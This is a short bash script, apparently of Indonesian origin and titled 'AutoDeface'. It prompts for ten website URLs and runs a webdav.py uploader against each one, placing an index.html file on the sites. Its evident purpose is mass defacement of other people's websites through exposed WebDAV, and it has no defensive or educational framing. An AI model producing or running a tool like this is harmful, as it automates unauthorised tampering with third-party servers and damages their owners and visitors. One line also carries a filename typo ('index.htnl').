clear

figlet AutoDeface

echo "============================"
echo " hapus tanda / di akhir url"
echo "============================"
read -p "URL[1]" f1
read -p "URL[2]" f2
read -p "URL[3]" f3
read -p "URL[4]" f4
read -p "URL[5]" f5
read -p "URL[6]" f6
read -p "URL[7]" f7
read -p "URL[8]" f8
read -p "URL[9]" f9
read -p "URL[10]" f10
python2 webdav.py $f1 index.html
python2 webdav.py $f2 index.html
python2 webdav.py $f3 index.html
python2 webdav.py $f4 index.html
python2 webdav.py $f5 index.html
python2 webdav.py $f6 index.htnl
python2 webdav.py $f7 index.html
python2 webdav.py $f8 index.html
python2 webdav.py $f9 index.html
python2 webdav.py $f10 index.html





